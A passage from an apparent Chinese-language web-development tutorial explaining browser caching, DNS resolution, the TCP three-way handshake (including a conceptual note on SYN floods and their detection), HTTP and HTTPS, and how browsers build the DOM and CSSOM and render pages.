<h5 id="ETag-响应头-、If-None-Match-请求头"><a href="#ETag-响应头-、If-None-Match-请求头" class="headerlink" title="ETag(响应头)、If-None-Match(请求头)"></a>ETag(响应头)、If-None-Match(请求头)</h5><p><code>ETag</code>是服务器根据当前文件的内容，给文件生成的唯一标识，只要里面的内容有改动，这个值就会变。服务器通过响应头把这个值给浏览器。 浏览器接收到 ETag 的值，会在下次请求时，将这个值作为<code>If-None-Match</code>这个字段的内容，并放到请求头中，然后发给服务器。</p>
<blockquote>
<p>如果两种方式都支持的话，服务器会优先考虑 ETag</p>
</blockquote>
<h4 id="存储位置"><a href="#存储位置" class="headerlink" title="存储位置"></a>存储位置</h4><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7e8553f944da4a4ea95333192a62f149~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<ul>
<li>Service Worker</li>
</ul>
<p><code>Service Worker</code> 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。使用 <code>Service Worker</code>的话，传输协议必须为 <code>HTTPS</code>。因为 <code>Service Worker</code> 中涉及到请求拦截，所以必须使用 <code>HTTPS</code> 协议来保障安全。<code>Service Worker</code> 的缓存与浏览器其他内建的缓存机制不同，它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的。</p>
<p><code>Service Worker</code> 实现缓存功能一般分为三个步骤：首先需要先注册 <code>Service Worker</code>，然后监听到 <code>install</code> 事件以后就可以缓存需要的文件，那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存，存在缓存的话就可以直接读取缓存文件，否则就去请求数据。</p>
<p>当 <code>Service Worker</code> 没有命中缓存的时候，我们需要去调用 <code>fetch</code> 函数获取数据。也就是说，如果我们没有在 <code>Service Worker</code> 命中缓存的话，会根据缓存查找优先级去查找数据。但是不管我们是从 <code>Memory Cache</code> 中还是从网络请求中获取的数据，浏览器都会显示我们是从 <code>Service Worker</code>中获取的内容。</p>
<ul>
<li>Memory Cache</li>
</ul>
<p><code>Memory Cache</code> 也就是内存中的缓存，主要包含的是当前中页面中已经抓取到的资源,例如页面上已经下载的样式、脚本、图片等。读取内存中的数据肯定比磁盘快,内存缓存虽然读取高效，可是缓存持续性很短，会随着进程的释放而释放。 一旦我们关闭 Tab 页面，内存中的缓存也就被释放了。</p>
<p>那么既然内存缓存这么高效，我们是不是能让数据都存放在内存中呢？ 这是不可能的。计算机中的内存一定比硬盘容量小得多，操作系统需要精打细算内存的使用，所以能让我们使用的内存必然不多。</p>
<blockquote>
<p>需要注意的事情是，内存缓存在缓存资源时并不关心返回资源的 HTTP 缓存头<code>Cache-Control</code>是什么值，同时资源的匹配也并非仅仅是对 URL 做匹配，还可能会对<code>Content-Type</code>，CORS 等其他特征做校验。</p>
</blockquote>
<ul>
<li>Disk Cache</li>
</ul>
<p><code>Disk Cache</code> 也就是存储在硬盘中的缓存，读取速度慢点，但是什么都能存储到磁盘中，比之 <code>Memory Cache</code> 胜在容量和存储时效性上。</p>
<ul>
<li>Push Cache</li>
</ul>
<p><code>Push Cache</code>（推送缓存）是 <code>HTTP/2</code> 中的内容，当以上三种缓存都没有命中时，它才会被使用。它只在会话（Session）中存在，一旦会话结束就被释放，并且缓存时间也很短暂，在 Chrome 浏览器中只有 5 分钟左右，同时它也并非严格执行 HTTP 头中的缓存指令。</p>
<ol>
<li>所有的资源都能被推送，并且能够被缓存,但是 <code>Edge</code> 和 <code>Safari</code> 浏览器支持相对比较差</li>
<li>可以推送 <code>no-cache</code> 和 <code>no-store</code> 的资源</li>
<li>一旦连接被关闭，<code>Push Cache</code> 就被释放</li>
<li>多个页面可以使用同一个<code>HTTP/2</code>的连接，也就可以使用同一个<code>Push Cache</code>。这主要还是依赖浏览器的实现而定，出于对性能的考虑，有的浏览器会对相同域名但不同的 tab 标签使用同一个 HTTP 连接。</li>
<li><code>Push Cache</code> 中的缓存只能被使用一次</li>
<li>浏览器可以拒绝接受已经存在的资源推送</li>
<li>你可以给其他域名推送资源</li>
</ol>
<h3 id="DNS-域名解析"><a href="#DNS-域名解析" class="headerlink" title="DNS 域名解析"></a>DNS 域名解析</h3><p>在发起 http 请求之前，浏览器首先要做去获得我们想访问网页的 IP 地址，浏览器会发送一个 UDP 的包给 DNS 域名解析服务器。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/20fcf62b9dc24b57a977d42efb9c8f43~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h4 id="递归查询"><a href="#递归查询" class="headerlink" title="递归查询"></a>递归查询</h4><p>我们的浏览器、操作系统、路由器都会缓存一些 URL 对应的 IP 地址，统称为 DNS 高速缓存。这是为了加快 DNS 解析速度，使得不必每次都到根域名服务器中去查询。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/53ade904cd724b13abbc7ed6ce8f7ff0~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h4 id="迭代查询"><a href="#迭代查询" class="headerlink" title="迭代查询"></a>迭代查询</h4><p>迭代查询的方式就是，局部的 DNS 服务器并不会自己向其他服务器进行查询，而是把能够解析该域名的服务器 IP 地址返回给客户端，客户端会不断的向这些服务器进行查询，直到查询到了位置，迭代的话只会帮你找到相关的服务器，然后说我现在比较忙，你自己去找吧。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8183fbfbcf294f268538034a22d7f1d4~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h4 id="DNS-负载均衡"><a href="#DNS-负载均衡" class="headerlink" title="DNS 负载均衡"></a>DNS 负载均衡</h4><p>DNS 还有负载均衡的作用，现在很多网站都有多个服务器，当一个网站访问量过大的时候，如果所有请求都请求在同一个服务器上，可能服务器就会崩掉，这时候就用到了 DNS 负载均衡技术，当一个网站有多个服务器地址时，在应答 DNS 查询的时候，DNS 服务器会对每个查询返回不同的解析结果，也就是返回不同的 IP 地址，从而把访问引导到不同的服务器上去，来达到负载均衡的目的。例如可以根据每台机器的负载量，或者该机器距离用户的地理位置距离等等条件。</p>
<h4 id="DNS-预解析"><a href="#DNS-预解析" class="headerlink" title="DNS 预解析"></a>DNS 预解析</h4><p>大型网站，有多个不同服务器资源的情况下，都可采取 DNS 预解析，提前解析，减少页面卡顿。 <img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/00916370a1a24620a63945f9c7bd1726~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="WeChata927fb47ad19a95887884e244ccc127a.png"></p>
<h2 id="第二部分-TCP-x2F-IP-连接：三次握手"><a href="#第二部分-TCP-x2F-IP-连接：三次握手" class="headerlink" title="第二部分 TCP&#x2F;IP 连接：三次握手"></a>第二部分 TCP&#x2F;IP 连接：三次握手</h2><h3 id="网络协议分层"><a href="#网络协议分层" class="headerlink" title="网络协议分层"></a>网络协议分层</h3><p><img src="https://i.imgur.com/Ft5xzr5.gif" alt="img"></p>
<h3 id="TCP-x2F-IP-协议"><a href="#TCP-x2F-IP-协议" class="headerlink" title="TCP&#x2F;IP 协议"></a>TCP&#x2F;IP 协议</h3><p>TCP(Transmission Control Protocol)传输控制协议。 TCP&#x2F;IP 协议将应用层、表示层、会话层合并为应用层，物理层和数据链路层合并为网络接口层。</p>
<blockquote>
<p>TCP&#x2F;IP 协议不仅仅指的是 TCP 和 IP 两个协议，⽽是指的⼀个由 FTP,SMTP,TCP,UDP,IP,ARP 等等协议构成的协议集合。</p>
</blockquote>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a94fcb306aca4a3fab639e96986a01e6~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>客服端和服务端在进行 http 请求和返回的工程中，需要创建一个<code>TCP connection</code>（由客户端发起）,<code>http</code>不存在连接这个概念，它只有请求和响应。请求和响应都是数据包，它们之间的传输通道就是<code>TCP connection</code>。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/370b0bfa7c8b47c6ad8d2a39f2d40f42~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<p>位码即 tcp 标志位，有 6 种标示：</p>
<ul>
<li>SYN(synchronous 建立联机)</li>
<li>ACK(acknowledgement 确认)</li>
<li>PSH(push 传送)</li>
<li>FIN(finish 结束)</li>
<li>RST(reset 重置)</li>
<li>URG(urgent 紧急)</li>
</ul>
<p>第一次握手：主机 A 发送位码为<code>SYN＝1</code>，随机产生<code>Seq number=1234567</code>的数据包到服务器，主机 B 由<code>SYN=1</code>知道，A 要求建立联机；（第一次握手，由浏览器发起，告诉服务器我要发送请求了）</p>
<p>第二次握手：主机 B 收到请求后要确认联机信息，向 A 发送<code>ack number=(主机A的seq+1)</code>，<code>SUN=1，ACK=1234567 + 1</code>，随机产生<code>Seq=7654321</code>的包；（第二次握手，由服务器发起，告诉浏览器我准备接受了，你赶紧发送吧）</p>
<p>第三次握手：主机 A 收到后检查<code>ack number</code>是否正确，即第一次发送的<code>seq number+1</code>，以及位码<code>SYN</code>是否为 1，若正确，主机 A 会再发送<code>ack number=(主机B的seq+1)</code>，<code>ack=7654321 + 1</code>，主机 B 收到后确认<code>Seq</code>值与<code>ACK=7654321+ 1</code>则连接建立成功；（第三次握手，由浏览器发送，告诉服务器，我马上就发了，准备接受吧）</p>
<blockquote>
<p>总是要问：为什么需要三次握手，两次不行吗？其实这是由 TCP 的自身特点<strong>可靠传输</strong>决定的。客户端和服务端要进行可靠传输，那么就需要<strong>确认双方的<code>接收</code>和<code>发送</code>能力</strong>。第一次握手可以确认客服端的<code>发送能力</code>,第二次握手，服务端<code>SYN=1,Seq=Y</code>就确认了<code>发送能力</code>,<code>ACK=X+1</code>就确认了<code>接收能力</code>,所以第三次握手才可以确认客户端的<code>接收能力</code>。不然容易出现丢包的现象。</p>
</blockquote>
<h4 id="第三次握手的必要性？"><a href="#第三次握手的必要性？" class="headerlink" title="第三次握手的必要性？"></a>第三次握手的必要性？</h4><p>试想如果是用两次握手，则会出现下面这种情况： 如客户端发出连接请求，但因连接请求报文丢失而未收到确认，于是客户端再重传一次连接请求。后来收到了确认，建立了连接。数据传输完毕后，就释放了连接，客户端共发出了两个连接请求报文段，其中第一个丢失，第二个到达了服务端，但是第一个丢失的报文段只是在某些网络结点长时间滞留了，延误到连接释放以后的某个时间才到达服务端，此时服务端误认为客户端又发出一次新的连接请求，于是就向客户端发出确认报文段，同意建立连接，不采用三次握手，只要服务端发出确认，就建立新的连接了，此时客户端忽略服务端发来的确认，也不发送数据，则服务端一致等待客户端发送数据，浪费资源。</p>
<h4 id="什么是半连接队列？"><a href="#什么是半连接队列？" class="headerlink" title="什么是半连接队列？"></a>什么是半连接队列？</h4><p>服务器第一次收到客户端的 SYN 之后，就会处于 SYN_RCVD 状态，此时双方还没有完全建立其连接，服务器会把此种状态下请求连接放在一个队列里，我们把这种队列称之为半连接队列。</p>
<p>当然还有一个全连接队列，就是已经完成三次握手，建立起连接的就会放在全连接队列中。如果队列满了就有可能会出现丢包现象。</p>
<p>这里在补充一点关于 SYN-ACK 重传次数的问题： 服务器发送完 SYN-ACK 包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传。如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。</p>
<p>注意，每次重传等待的时间不一定相同，一般会是指数增长，例如间隔时间为 1s，2s，4s，8s…</p>
<h4 id="ISN-是固定的吗？"><a href="#ISN-是固定的吗？" class="headerlink" title="ISN 是固定的吗？"></a>ISN 是固定的吗？</h4><p>当一端为建立连接而发送它的 SYN 时，它为连接选择一个初始序号。ISN 随时间而变化，因此每个连接都将具有不同的 ISN。ISN 可以看作是一个 32 比特的计数器，每 4ms 加 1 。这样选择序号的目的在于防止在网络中被延迟的分组在以后又被传送，而导致某个连接的一方对它做错误的解释。</p>
<p>三次握手的其中一个重要功能是客户端和服务端交换 ISN(Initial Sequence Number)，以便让对方知道接下来接收数据的时候如何按序列号组装数据。如果 ISN 是固定的，攻击者很容易猜出后续的确认号，因此 ISN 是动态生成的。</p>
<h4 id="三次握手过程中可以携带数据吗？"><a href="#三次握手过程中可以携带数据吗？" class="headerlink" title="三次握手过程中可以携带数据吗？"></a>三次握手过程中可以携带数据吗？</h4><p>其实第三次握手的时候，是可以携带数据的。但是，第一次、第二次握手不可以携带数据。</p>
<p>为什么这样呢?大家可以想一个问题，假如第一次握手可以携带数据的话，如果有人要恶意攻击服务器，那他每次都在第一次握手中的 SYN 报文中放入大量的数据。因为攻击者根本就不理服务器的接收、发送能力是否正常，然后疯狂着重复发 SYN 报文的话，这会让服务器花费很多时间、内存空间来接收这些报文。</p>
<p>也就是说，第一次握手不可以放数据，其中一个简单的原因就是会让服务器更加容易受到攻击了。而对于第三次的话，此时客户端已经处于 ESTABLISHED 状态。对于客户端来说，他已经建立起连接了，并且也已经知道服务器的接收、发送能力是正常的了，所以能携带数据也没啥毛病。</p>
<h4 id="SYN-攻击？"><a href="#SYN-攻击？" class="headerlink" title="SYN 攻击？"></a>SYN 攻击？</h4><p>服务器端的资源分配是在二次握手时分配的，而客户端的资源是在完成三次握手时分配的，所以服务器容易受到 SYN 洪泛攻击。SYN 攻击就是 Client 在短时间内伪造大量不存在的 IP 地址，并向 Server 不断地发送 SYN 包，Server 则回复确认包，并等待 Client 确认，由于源地址不存在，因此 Server 需要不断重发直至超时，这些伪造的 SYN 包将长时间占用未连接队列，导致正常的 SYN 请求因为队列满而被丢弃，从而引起网络拥塞甚至系统瘫痪。SYN 攻击是一种典型的 DoS&#x2F;DDoS 攻击。</p>
<p>检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源 IP 地址是随机的，基本上可以断定这是一次 SYN 攻击。在 Linux&#x2F;Unix 上可以使用系统自带的 netstats 命令来检测 SYN 攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -n -p TCP | grep SYN_RECV</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>常见的防御 SYN 攻击的方法有如下几种：</p>
<ul>
<li>缩短超时（SYN Timeout）时间</li>
<li>增加最大半连接数</li>
<li>过滤网关防护</li>
<li>SYN cookies 技术</li>
</ul>
<h2 id="第三部分-HTTP-请求"><a href="#第三部分-HTTP-请求" class="headerlink" title="第三部分 HTTP 请求"></a>第三部分 HTTP 请求</h2><h3 id="HTTP-发展历史"><a href="#HTTP-发展历史" class="headerlink" title="HTTP 发展历史"></a>HTTP 发展历史</h3><p>HTTP&#x2F;0.9</p>
<ul>
<li>只有一个命令 GET</li>
<li>响应类型: 仅 超文本</li>
<li>没有 header 等描述数据的信息</li>
<li>服务器发送完毕，就关闭 TCP 连接</li>
</ul>
<p>HTTP&#x2F;1.0</p>
<ul>
<li>增加了很多命令（post HESD ）</li>
<li>增加<code>status code</code> 和 <code>header</code></li>
<li>多字符集支持、多部分发送、权限、缓存等</li>
<li>响应：不再只限于超文本 (Content-Type 头部提供了传输 HTML 之外文件的能力 — 如脚本、样式或媒体文件)</li>
</ul>
<p>HTTP&#x2F;1.1</p>
<ul>
<li>持久连接。TCP 三次握手会在任何连接被建立之前发生一次。最终，当发送了所有数据之后，服务器发送一个消息，表示不会再有更多数据向客户端发送了；则客户端才会关闭连接（断开 TCP）</li>
<li>支持的方法: <code>GET</code> , <code>HEAD</code> , <code>POST</code> , <code>PUT</code> ,<code>DELETE</code> , <code>TRACE</code> , <code>OPTIONS</code></li>
<li>进行了重大的性能优化和特性增强，分块传输、压缩&#x2F;解压、内容缓存磋商、虚拟主机（有单个 IP 地址的主机具有多个域名）、更快的响应，以及通过增加缓存节省了更多的带宽</li>
</ul>
<p>HTTP2</p>
<ul>
<li>所有数据以二进制传输。HTTP1.x 是基于文本的，无法保证健壮性，HTTP2.0 绝对使用新的二进制格式，方便且健壮</li>
<li>同一个连接里面发送多个请求不再需要按照顺序来</li>
<li>头信息压缩以及推送等提高效率的功能</li>
</ul>
<p>HTTP3</p>
<ul>
<li>QUIC“快速 UDP 互联网连接”（Quick UDP Internet Connections）</li>
</ul>
<p>HTTP3 的主要改进在传输层上。传输层不会再有我前面提到的那些繁重的 TCP 连接了。现在，一切都会走 UDP。</p>
<p><a href="https://link.juejin.cn/?target=https://http3-explained.haxx.se/zh/zh">HTTP3 详细介绍</a></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e7a0e406ca6544498c6d1005950247bb~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h3 id="HTTP-协议特点"><a href="#HTTP-协议特点" class="headerlink" title="HTTP 协议特点"></a>HTTP 协议特点</h3><ol>
<li>支持客户&#x2F;服务器模式。</li>
<li>简单快速客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有 GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于 HTTP 协议简单，使得 HTTP 服务器的程序规模小，因而通信速度很快。</li>
<li>灵活：HTTP 允许传输任意类型的数据对象。正在传输的类型由 Content-Type（Content-Type 是 HTTP 包中用来表示内容类型的标识）加以标记。</li>
<li>无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</li>
<li>无状态：HTTP 协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</li>
</ol>
<blockquote>
<p>现在 HTTP3 最快！</p>
</blockquote>
<h3 id="HTTP-报文"><a href="#HTTP-报文" class="headerlink" title="HTTP 报文"></a>HTTP 报文</h3><p>请求报文： <img src="https://i.imgur.com/AVQ3UcM.jpg" alt="img"></p>
<p>响应报文： <img src="https://i.imgur.com/o0vnSMW.jpg" alt="img"></p>
<h3 id="各协议与-HTTP-协议关系"><a href="#各协议与-HTTP-协议关系" class="headerlink" title="各协议与 HTTP 协议关系"></a>各协议与 HTTP 协议关系</h3><ul>
<li>DNS 服务：解析域名至对应的 IP 地址</li>
<li>HTTP 协议：生成针对目标 Web 服务器的 HTTP 请求报文</li>
<li>TCP 协议：将请求报文按序号分割成多个报文段</li>
<li>IP 协议：搜索对方的地址，一边中转一边传送</li>
<li>TCP 协议：按序号以原来的顺序重组请求报文请求的处理结果也同样利用 TCP&#x2F;IP 协议向用户进行回传</li>
</ul>
<blockquote>
<ul>
<li>TCP 是底层通讯协议，定义的是数据传输和连接方式的规范；</li>
</ul>
</blockquote>
<ul>
<li>HTTP 是应用层协议，定义的是传输数据的内容的规范；</li>
<li>HTTP 协议中的数据是利用 TCP 协议传输的，所以支持 HTTP 也就一定支持 TCP。</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/33426919b394498192132b6249479a3e~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<blockquote>
<p>关于 HTTP 的东西还有很多，我在最后放了张<a href="#%E5%85%B3%E4%BA%8Ehttp">大图</a>。</p>
</blockquote>
<h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>在 HTTP 的基础上再加一层 TLS（传输层安全性协议）或者 SSL（安全套接层），就构成了 HTTPS 协议。</p>
<p>HTTPS 默认工作在 TCP 协议 443 端口，它的工作流程一般如以下方式：</p>
<ol>
<li>TCP 三次同步握手</li>
<li>客户端验证服务器数字证书</li>
<li>DH 算法协商对称加密算法的密钥、hash 算法的密钥</li>
<li>SSL 安全加密隧道协商完成</li>
<li>网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的 hash 算法进行数据完整性保护，保证数据不被篡改。</li>
</ol>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/60694ff60bd94c6eaa34e9c8c3ec8f6e~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<ol>
<li><p>客户端向服务端发送 <code>Client Hello</code> 消息，其中携带客户端支持的协议版本、加密算法、压缩算法以及客户端生成的随机数；</p>
</li>
<li><p>服务端收到客户端支持的协议版本、加密算法等信息后；</p>
<ol>
<li>向客户端发送 <code>Server Hello</code> 消息，并携带选择特定的协议版本、加密方法、会话 ID 以及服务端生成的随机数；</li>
<li>向客户端发送 <code>Certificate</code> 消息，即服务端的证书链，其中包含证书支持的域名、发行方和有效期等信息；</li>
<li>向客户端发送 <code>Server Key Exchange</code> 消息，传递公钥以及签名等信息；</li>
<li>向客户端发送可选的消息 <code>Certificate Request</code>，验证客户端的证书；</li>
<li>向客户端发送 <code>Server Hello Done</code> 消息，通知服务端已经发送了全部的相关信息；</li>
</ol>
</li>
<li><p>客户端收到服务端的协议版本、加密方法、会话 ID 以及证书等信息后，验证服务端的证书；</p>
<ol>
<li>向服务端发送 <code>Client Key Exchange</code> 消息，包含使用服务端公钥加密后的随机字符串，即预主密钥（<code>Pre Master Secret</code>）；</li>
<li>向服务端发送 <code>Change Cipher Spec</code> 消息，通知服务端后面的数据段会加密传输；</li>
<li>向服务端发送 <code>Finished</code> 消息，其中包含加密后的握手信息；</li>
</ol>
</li>
<li><p>服务端收到</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Change Cipher Spec</span><br></pre></td></tr></table></figure>

<p>和</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Finished</span><br></pre></td></tr></table></figure>

<p>消息后；</p>
<ol>
<li>向客户端发送 <code>Change Cipher Spec</code> 消息，通知客户端后面的数据段会加密传输；</li>
<li>向客户端发送 <code>Finished</code> 消息，验证客户端的 <code>Finished</code> 消息并完成 TLS 握手；</li>
</ol>
</li>
</ol>
<p>TLS 握手的关键在于利用通信双发生成的随机字符串和服务端的证书公钥生成一个双方经过协商后的对称密钥，这样通信双方就可以使用这个对称密钥在后续的数据传输中加密消息数据，防止中间人的监听和攻击，保证通讯安全。</p>
<blockquote>
<p>HTTPS 连接 需要 7 次握手，3 次 TCP + 4 次 TLS。</p>
</blockquote>
<h2 id="第四部分-服务器处理请求并返回-HTTP-报文"><a href="#第四部分-服务器处理请求并返回-HTTP-报文" class="headerlink" title="第四部分 服务器处理请求并返回 HTTP 报文"></a>第四部分 服务器处理请求并返回 HTTP 报文</h2><p>每台服务器上都会安装处理请求的应用——Web Server。常见的 Web Server 产品有 <code>apache</code>、<code>nginx</code>、<code>IIS</code> 或 <code>Lighttpd</code> 等。</p>
<p>HTTP 请求一般可以分为两类，静态资源 和 动态资源。</p>
<p>请求访问静态资源，这个就直接根据 url 地址去服务器里找就好了。</p>
<p>请求动态资源的话，就需要 web server 把不同请求，委托给服务器上处理相应请求的程序进行处理（例如 CGI 脚本，JSP 脚本，servlets，ASP 脚本，服务器端 JavaScript，或者一些其它的服务器端技术等），然后返回后台程序处理产生的结果作为响应，发送到客户端。</p>
<p>服务器在处理请求的时候主要有三种方式：</p>
<ul>
<li>第一种：是用一个线程来处理所有的请求，并且同时只能处理一个请求，但是这样的话性能是非常的低的。</li>
<li>第二种：是每一个请求都给他分配一个线程但是当链接和请求比较多的时候就会导致服务器的 cpu 不堪重负。</li>
<li>第三种：就是采用复用 I&#x2F;O 的方式来处理例如通过 epoll 方式监视所有链接当链接状态发生改变的时候才去分配空间进行处理。</li>
</ul>
<h2 id="第五部分-浏览器渲染页面"><a href="#第五部分-浏览器渲染页面" class="headerlink" title="第五部分 浏览器渲染页面"></a>第五部分 浏览器渲染页面</h2><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5a2a996acb054128b670bf37e3f51748~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h3 id="DOM-树"><a href="#DOM-树" class="headerlink" title="DOM 树"></a>DOM 树</h3><p>字节 → 字符 → 令牌 → 节点 → 对象模型。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Critical Path<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">span</span>&gt;</span>web performance<span class="tag">&lt;/<span class="name">span</span>&gt;</span> students!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;awesome-photo.jpg&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/eca4b9406f614b27aaa2d2456b690ece~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<ul>
<li>转换: 浏览器从磁盘或网络读取 HTML 的原始字节，并根据文件的指定编码（例如 UTF-8）将它们转换成各个字符。</li>
<li>令牌化: 浏览器将字符串转换成 W3C HTML5 标准规定的各种令牌，例如，“”、“”，以及其他尖括号内的字符串。每个令牌都具有特殊含义和一组规则。</li>
<li>词法分析: 发出的令牌转换成定义其属性和规则的“对象”。</li>
<li>DOM 构建: 最后，由于 HTML 标记定义不同标记之间的关系（一些标记包含在其他标记内），创建的对象链接在一个树数据结构内，此结构也会捕获原始标记中定义的父项-子项关系: HTML 对象是 body 对象的父项，body 是 paragraph 对象的父项，依此类推。</li>
</ul>
<h3 id="CSS-对象模型-CSSOM"><a href="#CSS-对象模型-CSSOM" class="headerlink" title="CSS 对象模型 (CSSOM)"></a>CSS 对象模型 (CSSOM)</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123; <span class="attribute">font-size</span>: <span class="number">16px</span> &#125;</span><br><span class="line"><span class="selector-tag">p</span> &#123; <span class="attribute">font-weight</span>: bold &#125;</span><br><span class="line"><span class="selector-tag">span</span> &#123; <span class="attribute">color</span>: red &#125;</span><br><span class="line"><span class="selector-tag">p</span> <span class="selector-tag">span</span> &#123; <span class="attribute">display</span>: none &#125;</span><br><span class="line"><span class="selector-tag">img</span> &#123; <span class="attribute">float</span>: right &#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/da24d993636041ba8d97ce9be9b66f44~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dd08d03c593c41ffbc618d0316c7c871~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h3 id="布局树-Layout-Tree"><a href="#布局树-Layout-Tree" class="headerlink" title="布局树 Layout Tree"></a>布局树 Layout Tree</h3><ul>
<li>DOM 树与 CSSOM 树合并后形成渲染树。</li>
<li>渲染树只包含渲染网页所需的节点。</li>
<li>布局计算每个对象的精确位置和大小。</li>
<li>最后一步是绘制，使用最终渲染树将像素渲染到屏幕上。</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/02120424763f4492a5370919bc3504e8~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h3 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h3><p>渲染流程：</p>
<ol>
<li>获取 DOM 后分割为多个图层</li>
<li>对每个图层的节点计算样式结果 （Recalculate style–样式重计算）</li>
<li>为每个节点生成图形和位置 （Layout–重排,回流）</li>
<li>将每个节点绘制填充到图层位图中 （Paint–重绘）</li>
<li>图层作为纹理上传至 GPU</li>
<li>组合多个图层到页面上生成最终屏幕图像 （Composite Layers–图层重组）</li>
</ol>
